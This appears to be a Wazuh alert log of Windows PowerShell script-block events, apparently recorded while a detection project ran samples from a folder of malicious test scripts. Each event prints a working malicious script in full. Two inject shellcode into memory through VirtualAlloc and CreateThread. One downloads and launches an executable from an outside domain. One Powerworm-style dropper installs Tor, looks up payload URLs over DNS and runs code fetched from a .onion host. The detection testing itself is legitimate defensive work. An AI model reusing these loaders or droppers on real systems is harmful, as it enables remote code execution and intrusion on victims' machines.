{"timestamp":"2026-07-06T02:19:23.420+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":10,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304363.2642152","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:43.5962347Z","eventRecordID":"145122","processID":"1264","threadID":"4780","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nfunction fwfaCeqD {\r\n\tParam ($t4GPHo6m, $tzEP)\t\t\r\n\t$itc7vIv = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\r\n\t\r\n\treturn $itc7vIv.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($itc7vIv.GetMethod('GetModuleHandle')).Invoke($null, @($t4GPHo6m)))), $tzEP))\r\n}\r\n\r\nfunction iCjCN1Zma {\r\n\tParam (\r\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $l7f,\r\n\t\t[Parameter(Position = 1)] [Type] $iZcjlvhhxb = [Void]\r\n\t)\r\n\t\r\n\t$w0SLovYTCfOw = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\r\n\t$w0SLovYTCfOw.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $l7f).SetImplementationFlags('Runtime, Managed')\r\n\t$w0SLovYTCfOw.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $iZcjlvhhxb, $l7f).SetImplementationFlags('Runtime, Managed')\r\n\t\r\n\treturn $w0SLovYTCfOw.CreateType()\r\n}\r\n\r\n[Byte[]]$wHzDn2ZFqGM = [System.Convert]::FromBase64String(\"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKgBB2gCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V\")\r\n\t\t\r\n$nOkJeRa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fwfaCeqD kernel32.dll VirtualAlloc), (iCjCN1Zma @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $wHzDn2ZFqGM.Length,0x3000, 0x40)\r\n[System.Runtime.InteropServices.Marshal]::Copy($wHzDn2ZFqGM, 0, $nOkJeRa, $wHzDn2ZFqGM.length)\r\n\r\n$cTos9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fwfaCeqD kernel32.dll CreateThread), (iCjCN1Zma @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nOkJeRa,[IntPtr]::Zero,0,[IntPtr]::Zero)\r\n[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fwfaCeqD kernel32.dll WaitForSingleObject), (iCjCN1Zma @([IntPtr], [Int32]))).Invoke($cTos9,0xffffffff) | Out-Null\r\n\r\nScriptBlock ID: e40b961b-9492-46c0-87f9-30e52e34ba2a\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"function fwfaCeqD {   Param ($t4GPHo6m, $tzEP)\\t\\t   $itc7vIv = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')      return $itc7vIv.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($itc7vIv.GetMethod('GetModuleHandle')).Invoke($null, @($t4GPHo6m)))), $tzEP))  }    function iCjCN1Zma {   Param (    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $l7f,    [Parameter(Position = 1)] [Type] $iZcjlvhhxb = [Void]   )      $w0SLovYTCfOw = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])   $w0SLovYTCfOw.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $l7f).SetImplementationFlags('Runtime, Managed')   $w0SLovYTCfOw.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $iZcjlvhhxb, $l7f).SetImplementationFlags('Runtime, Managed')      return $w0SLovYTCfOw.CreateType()  }    [Byte[]]$wHzDn2ZFqGM = [System.Convert]::FromBase64String(\\\"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKgBB2gCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V\\\")      $nOkJeRa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fwfaCeqD kernel32.dll VirtualAlloc), (iCjCN1Zma @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $wHzDn2ZFqGM.Length,0x3000, 0x40)  [System.Runtime.InteropServices.Marshal]::Copy($wHzDn2ZFqGM, 0, $nOkJeRa, $wHzDn2ZFqGM.length)    $cTos9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fwfaCeqD kernel32.dll CreateThread), (iCjCN1Zma @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nOkJeRa,[IntPtr]::Zero,0,[IntPtr]::Zero)  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fwfaCeqD kernel32.dll WaitForSingleObject), (iCjCN1Zma @([IntPtr], [Int32]))).Invoke($cTos9,0xffffffff) | Out-Null","scriptBlockId":"e40b961b-9492-46c0-87f9-30e52e34ba2a"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:25.765+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":9,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304365.2654631","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:45.7509532Z","eventRecordID":"145143","processID":"7380","threadID":"7308","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('http://getlohnumceders.honor.es/kimt.exe',\"$env:TEMP\\kimt.exe\");Start-Process (\"$env:TEMP\\kimt.exe\")\r\n\r\nScriptBlock ID: 4c7e7959-1032-484e-814a-983fb9ab7b91\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2047.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('http://getlohnumceders.honor.es/kimt.exe',\\\"$env:TEMP\\\\kimt.exe\\\");Start-Process (\\\"$env:TEMP\\\\kimt.exe\\\")","scriptBlockId":"4c7e7959-1032-484e-814a-983fb9ab7b91","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2047.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:25.885+0000","rule":{"level":4,"description":"Powershell executing process discovery","id":"91815","mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]},"firedtimes":4,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304365.2657220","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:46.4702610Z","eventRecordID":"145147","processID":"2416","threadID":"7952","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n'lVBjWW';$ErrorActionPreference = 'SilentlyContinue';'jNQOAiMMkdR';'jmq';$wwo = (get-wmiobject Win32_ComputerSystemProduct).UUID;'SaRt';'ElFeXOtQjz';if ((gp HKCU:\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) -match $wwo){;'QaVdFFjj';'MtqBu';(Get-Process -id $pid).Kill();'cw';'ONBGZ';};'XXzyExPxFhY';'pMdSFKqrvLa';'ZbEKbSUh';'xjpZeYDv';function e($qza){;'bGaLALnMw';'ENxLTKdj';$orot = (((iex \"nslookup -querytype=txt $qza 8.8.8.8\") -match '\"') -replace '\"', '')[0].Trim();'ZuiAzZT';'In';$bp.DownloadFile($orot, $ai);'PRCLIFVQH';'cV';$fi = $fjx.NameSpace($ai).Items();'cmBlkiUW';'pJsbWflOAQ';$fjx.NameSpace($zui).CopyHere($fi, 20);'fLGzW';'qa';rd $ai;'ItpK';'gAcxQokjbdq';};'dfbWqLt';'pyiBJGPrs';'SHreDrqslGO';'bmXjlGkPNOW';'vLb';'tHZFGFEVS';$zui = $env:APPDATA + '\\' + $wwo;'QFYaEbYU';'VybKxYISVV';if (!(Test-Path $zui)){;'lasxg';'WUdKHY';$jnj = New-Item -ItemType Directory -Force -Path $zui;'WSBNzrQWRp';'OmrLJSCcsb';$jnj.Attributes = \"Hidden\", \"System\", \"NotContentIndexed\";'AVKt';'XzQSC';};'csPpLz';'GqA';'XUNcRs';'uadZs';$fkz=$zui+ '\\tor.exe';'ctAUS';'ndDdWliZv';$szeo=$zui+ '\\polipo.exe';'cC';'vMtZk';$ai=$zui+'\\'+$wwo+'.zip';'krKyEjhs';'Jrixyw';$bp=New-Object System.Net.WebClient;'qgloHvfj';'kmNWBZwaAR';$fjx=New-Object -C Shell.Application;'XYLIkQ';'ZOUu';'YEJF';'NYC';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'HkuNDGZjxPN';'zNObipamCT';e 'i.vankin.de';'lcNRnsrLznG';'JeIDPkUPcaM';};'PccwMqmjIr';'Lcj';'RSdcbBdrW';'KtWZIdMo';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'eURPtEd';'qAoH';e 'gg.ibiz.cc';'CkjK';'HrLr';};'BDo';'dhVYRufO';'qTtR';'wWHNry';$wc=$zui+'\\roaminglog';'xPQgK';'aFgl';saps $fkz -Ar \" --Log `\"notice file $wc`\"\" -wi Hidden;'sH';'qvkWgQFN';do{sleep 1;$ll=gc $wc}while(!($ll -match 'Bootstrapped 100%: Done.'));'JzJtwaoxod';'fmLibNDQXiT';saps $szeo -a \"socksParentProxy=localhost:9050\" -wi Hidden;'MMLB';'PB';sleep 7;'rmt';'UGYZoHaPrID';$lf=New-Object System.Net.WebProxy(\"localhost:8123\");'mjeAqU';'HhVz';$lf.useDefaultCredentials = $true;'EowjlibIiiy';'Joz';$bp.proxy=$lf;'tQmlyxgSqL';'OPYAuEpisAz';$oxq='http://powerwormjqj42hu.onion/get.php?s=setup&uid=' + $wwo;'LcO';'YzTyALP';while(!$cl){$cl=$bp.downloadString($oxq)};'lMB';'FQQpJnA';if ($cl -ne 'none'){;'TKNTo';'IN';iex $cl;'PiM';'Jeylef';};'JiokKK';\r\n\r\nScriptBlock ID: 76d1df63-50a2-4054-8aa3-60efab175155\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\205.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"'lVBjWW';$ErrorActionPreference = 'SilentlyContinue';'jNQOAiMMkdR';'jmq';$wwo = (get-wmiobject Win32_ComputerSystemProduct).UUID;'SaRt';'ElFeXOtQjz';if ((gp HKCU:\\\\\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run) -match $wwo){;'QaVdFFjj';'MtqBu';(Get-Process -id $pid).Kill();'cw';'ONBGZ';};'XXzyExPxFhY';'pMdSFKqrvLa';'ZbEKbSUh';'xjpZeYDv';function e($qza){;'bGaLALnMw';'ENxLTKdj';$orot = (((iex \\\"nslookup -querytype=txt $qza 8.8.8.8\\\") -match '\\\"') -replace '\\\"', '')[0].Trim();'ZuiAzZT';'In';$bp.DownloadFile($orot, $ai);'PRCLIFVQH';'cV';$fi = $fjx.NameSpace($ai).Items();'cmBlkiUW';'pJsbWflOAQ';$fjx.NameSpace($zui).CopyHere($fi, 20);'fLGzW';'qa';rd $ai;'ItpK';'gAcxQokjbdq';};'dfbWqLt';'pyiBJGPrs';'SHreDrqslGO';'bmXjlGkPNOW';'vLb';'tHZFGFEVS';$zui = $env:APPDATA + '\\\\' + $wwo;'QFYaEbYU';'VybKxYISVV';if (!(Test-Path $zui)){;'lasxg';'WUdKHY';$jnj = New-Item -ItemType Directory -Force -Path $zui;'WSBNzrQWRp';'OmrLJSCcsb';$jnj.Attributes = \\\"Hidden\\\", \\\"System\\\", \\\"NotContentIndexed\\\";'AVKt';'XzQSC';};'csPpLz';'GqA';'XUNcRs';'uadZs';$fkz=$zui+ '\\\\tor.exe';'ctAUS';'ndDdWliZv';$szeo=$zui+ '\\\\polipo.exe';'cC';'vMtZk';$ai=$zui+'\\\\'+$wwo+'.zip';'krKyEjhs';'Jrixyw';$bp=New-Object System.Net.WebClient;'qgloHvfj';'kmNWBZwaAR';$fjx=New-Object -C Shell.Application;'XYLIkQ';'ZOUu';'YEJF';'NYC';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'HkuNDGZjxPN';'zNObipamCT';e 'i.vankin.de';'lcNRnsrLznG';'JeIDPkUPcaM';};'PccwMqmjIr';'Lcj';'RSdcbBdrW';'KtWZIdMo';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'eURPtEd';'qAoH';e 'gg.ibiz.cc';'CkjK';'HrLr';};'BDo';'dhVYRufO';'qTtR';'wWHNry';$wc=$zui+'\\\\roaminglog';'xPQgK';'aFgl';saps $fkz -Ar \\\" --Log `\\\"notice file $wc`\\\"\\\" -wi Hidden;'sH';'qvkWgQFN';do{sleep 1;$ll=gc $wc}while(!($ll -match 'Bootstrapped 100%: Done.'));'JzJtwaoxod';'fmLibNDQXiT';saps $szeo -a \\\"socksParentProxy=localhost:9050\\\" -wi Hidden;'MMLB';'PB';sleep 7;'rmt';'UGYZoHaPrID';$lf=New-Object System.Net.WebProxy(\\\"localhost:8123\\\");'mjeAqU';'HhVz';$lf.useDefaultCredentials = $true;'EowjlibIiiy';'Joz';$bp.proxy=$lf;'tQmlyxgSqL';'OPYAuEpisAz';$oxq='http://powerwormjqj42hu.onion/get.php?s=setup&amp;uid=' + $wwo;'LcO';'YzTyALP';while(!$cl){$cl=$bp.downloadString($oxq)};'lMB';'FQQpJnA';if ($cl -ne 'none'){;'TKNTo';'IN';iex $cl;'PiM';'Jeylef';};'JiokKK';","scriptBlockId":"76d1df63-50a2-4054-8aa3-60efab175155","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\205.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:26.914+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":94,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304366.2668303","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:47.2858268Z","eventRecordID":"145151","processID":"6336","threadID":"1892","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$08Q = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $08Q -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xce,0xb8,0x97,0x02,0xfe,0x68,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x71,0x31,0x43,0x17,0x83,0xeb,0xfc,0x03,0xd4,0x11,0x1c,0x9d,0x26,0xfd,0x69,0x5e,0xd6,0xfe,0x09,0xd6,0x33,0xcf,0x1b,0x8c,0x30,0x62,0xac,0xc6,0x14,0x8f,0x47,0x8a,0x8c,0x04,0x25,0x03,0xa3,0xad,0x80,0x75,0x8a,0x2e,0x25,0xba,0x40,0xec,0x27,0x46,0x9a,0x21,0x88,0x77,0x55,0x34,0xc9,0xb0,0x8b,0xb7,0x9b,0x69,0xc0,0x6a,0x0c,0x1d,0x94,0xb6,0x2d,0xf1,0x93,0x87,0x55,0x74,0x63,0x73,0xec,0x77,0xb3,0x2c,0x7b,0x3f,0x2b,0x46,0x23,0xe0,0x4a,0x8b,0x37,0xdc,0x05,0xa0,0x8c,0x96,0x94,0x60,0xdd,0x57,0xa7,0x4c,0xb2,0x69,0x08,0x41,0xca,0xae,0xae,0xba,0xb9,0xc4,0xcd,0x47,0xba,0x1e,0xac,0x93,0x4f,0x83,0x16,0x57,0xf7,0x67,0xa7,0xb4,0x6e,0xe3,0xab,0x71,0xe4,0xab,0xaf,0x84,0x29,0xc0,0xcb,0x0d,0xcc,0x07,0x5a,0x55,0xeb,0x83,0x07,0x0d,0x92,0x92,0xed,0xe0,0xab,0xc5,0x49,0x5c,0x0e,0x8d,0x7b,0x89,0x28,0xcc,0x13,0x23,0x50,0x9b,0xe3,0xd3,0xed,0x0a,0x8d,0x4a,0x9b,0x2b,0x05,0xe5,0xd7,0xc4,0x83,0xf2,0x18,0xff,0xfa,0x03,0xb1,0x57,0xab,0xac,0x68,0x30,0x69,0x05,0xec,0x67,0x72,0x7c,0xe5,0x08,0xd7,0x4e,0x33,0x99,0xb6,0xda,0xc0,0x4b,0x69,0x71,0x97,0x38,0xd9,0xed,0x40,0x36,0x46,0x2b,0x91,0x9d,0x93,0xfb,0x37,0x2f,0xb1,0x56,0xa0,0x4f,0x07,0x37,0xb4,0x02,0x35,0xe5,0xe5,0xf0,0xe9,0x61,0xed,0xa0,0x27,0x49,0x0e,0x9f,0xbe,0x6b,0x9a,0x30,0x9b,0x1b,0xdb,0x02,0x1b,0xdc,0x52,0x84,0x71,0xd8,0x34,0x2f,0x9a,0xb6,0xdc,0xda,0xe2,0xa8,0x9b,0xda,0x3f,0xe5,0x5c,0x73,0xe8,0x51,0xf4,0x2a,0x7e,0x73,0xfc,0xca,0x05,0x74,0xd5,0x6e,0x39,0xff,0xf8,0x3b,0xb6,0x84,0x8e,0xbc,0xc8,0x84,0x7b,0x6d,0x21,0x1c,0x7b,0x8e,0xb1,0xf5,0xd0,0x71,0x4e,0xfa,0x06,0xe3,0xdf,0x61,0x2c,0x97,0x7a,0x19,0xe1,0x14,0xf2,0xb4,0x8e,0xf5,0x94,0x32,0x1a,0x6f,0x1a,0xd5,0xb9,0x03,0xf4,0x4c,0x3a,0xb9,0x08,0x64,0xd1,0x70,0xc8,0x25,0x76,0x19,0xca,0xb3,0x74,0x8d,0xa0,0x41,0x13,0x2f,0x63,0x2e,0x39,0xd9,0x51,0xe1,0x42,0xf3,0xf6,0xcf,0x7c,0x9a,0x40,0x2b,0x7e,0x4a,0x74,0x60,0x0d,0xc0,0x50,0x81,0x3c,0x19,0x2c,0x92,0x6e,0xc8,0x1a,0xfd,0x9c,0x7c,0x2b,0x1f,0x5f,0x55,0xae,0x20,0xd4,0x7b,0xe8,0x25,0xd5,0xf0,0x1e,0x4c,0xd6,0xac,0x4e,0x1d,0x92,0x68,0x62,0x4d,0x48,0x19,0x57,0x3a,0xc0,0x82,0x58,0x11,0x9f,0xd9,0xa2,0x71,0x6e,0x72,0xc2,0x43,0xf9,0xf2,0x40,0xb3,0xd3,0x97,0x64,0x1c,0xb4,0x56,0xef,0xcd,0xc3,0x66,0x3a,0x7b,0xcc,0xf0,0x34,0xc9,0x6e,0x56,0x4b,0xe7,0x87,0xc7,0x4c,0xf7,0xa7,0x96,0x9c,0x78,0x36,0x00,0xe0,0x90,0x38,0x30,0x1f,0x9f,0xae,0xbf,0xba,0x0d,0x58,0x2b,0x6a,0xbd,0xf1,0xab;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$QWjc=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($QWjc.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$QWjc,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: cb1cf043-1dc7-4475-9cfc-4c540462f720\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2063.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$08Q = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $08Q -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xce,0xb8,0x97,0x02,0xfe,0x68,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x71,0x31,0x43,0x17,0x83,0xeb,0xfc,0x03,0xd4,0x11,0x1c,0x9d,0x26,0xfd,0x69,0x5e,0xd6,0xfe,0x09,0xd6,0x33,0xcf,0x1b,0x8c,0x30,0x62,0xac,0xc6,0x14,0x8f,0x47,0x8a,0x8c,0x04,0x25,0x03,0xa3,0xad,0x80,0x75,0x8a,0x2e,0x25,0xba,0x40,0xec,0x27,0x46,0x9a,0x21,0x88,0x77,0x55,0x34,0xc9,0xb0,0x8b,0xb7,0x9b,0x69,0xc0,0x6a,0x0c,0x1d,0x94,0xb6,0x2d,0xf1,0x93,0x87,0x55,0x74,0x63,0x73,0xec,0x77,0xb3,0x2c,0x7b,0x3f,0x2b,0x46,0x23,0xe0,0x4a,0x8b,0x37,0xdc,0x05,0xa0,0x8c,0x96,0x94,0x60,0xdd,0x57,0xa7,0x4c,0xb2,0x69,0x08,0x41,0xca,0xae,0xae,0xba,0xb9,0xc4,0xcd,0x47,0xba,0x1e,0xac,0x93,0x4f,0x83,0x16,0x57,0xf7,0x67,0xa7,0xb4,0x6e,0xe3,0xab,0x71,0xe4,0xab,0xaf,0x84,0x29,0xc0,0xcb,0x0d,0xcc,0x07,0x5a,0x55,0xeb,0x83,0x07,0x0d,0x92,0x92,0xed,0xe0,0xab,0xc5,0x49,0x5c,0x0e,0x8d,0x7b,0x89,0x28,0xcc,0x13,0x23,0x50,0x9b,0xe3,0xd3,0xed,0x0a,0x8d,0x4a,0x9b,0x2b,0x05,0xe5,0xd7,0xc4,0x83,0xf2,0x18,0xff,0xfa,0x03,0xb1,0x57,0xab,0xac,0x68,0x30,0x69,0x05,0xec,0x67,0x72,0x7c,0xe5,0x08,0xd7,0x4e,0x33,0x99,0xb6,0xda,0xc0,0x4b,0x69,0x71,0x97,0x38,0xd9,0xed,0x40,0x36,0x46,0x2b,0x91,0x9d,0x93,0xfb,0x37,0x2f,0xb1,0x56,0xa0,0x4f,0x07,0x37,0xb4,0x02,0x35,0xe5,0xe5,0xf0,0xe9,0x61,0xed,0xa0,0x27,0x49,0x0e,0x9f,0xbe,0x6b,0x9a,0x30,0x9b,0x1b,0xdb,0x02,0x1b,0xdc,0x52,0x84,0x71,0xd8,0x34,0x2f,0x9a,0xb6,0xdc,0xda,0xe2,0xa8,0x9b,0xda,0x3f,0xe5,0x5c,0x73,0xe8,0x51,0xf4,0x2a,0x7e,0x73,0xfc,0xca,0x05,0x74,0xd5,0x6e,0x39,0xff,0xf8,0x3b,0xb6,0x84,0x8e,0xbc,0xc8,0x84,0x7b,0x6d,0x21,0x1c,0x7b,0x8e,0xb1,0xf5,0xd0,0x71,0x4e,0xfa,0x06,0xe3,0xdf,0x61,0x2c,0x97,0x7a,0x19,0xe1,0x14,0xf2,0xb4,0x8e,0xf5,0x94,0x32,0x1a,0x6f,0x1a,0xd5,0xb9,0x03,0xf4,0x4c,0x3a,0xb9,0x08,0x64,0xd1,0x70,0xc8,0x25,0x76,0x19,0xca,0xb3,0x74,0x8d,0xa0,0x41,0x13,0x2f,0x63,0x2e,0x39,0xd9,0x51,0xe1,0x42,0xf3,0xf6,0xcf,0x7c,0x9a,0x40,0x2b,0x7e,0x4a,0x74,0x60,0x0d,0xc0,0x50,0x81,0x3c,0x19,0x2c,0x92,0x6e,0xc8,0x1a,0xfd,0x9c,0x7c,0x2b,0x1f,0x5f,0x55,0xae,0x20,0xd4,0x7b,0xe8,0x25,0xd5,0xf0,0x1e,0x4c,0xd6,0xac,0x4e,0x1d,0x92,0x68,0x62,0x4d,0x48,0x19,0x57,0x3a,0xc0,0x82,0x58,0x11,0x9f,0xd9,0xa2,0x71,0x6e,0x72,0xc2,0x43,0xf9,0xf2,0x40,0xb3,0xd3,0x97,0x64,0x1c,0xb4,0x56,0xef,0xcd,0xc3,0x66,0x3a,0x7b,0xcc,0xf0,0x34,0xc9,0x6e,0x56,0x4b,0xe7,0x87,0xc7,0x4c,0xf7,0xa7,0x96,0x9c,0x78,0x36,0x00,0xe0,0x90,0x38,0x30,0x1f,0x9f,0xae,0xbf,0xba,0x0d,0x58,0x2b,0x6a,0xbd,0xf1,0xab;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$QWjc=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($QWjc.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$QWjc,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"cb1cf043-1dc7-4475-9cfc-4c540462f720","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2063.ps1"}}},"location":"EventChannel"}
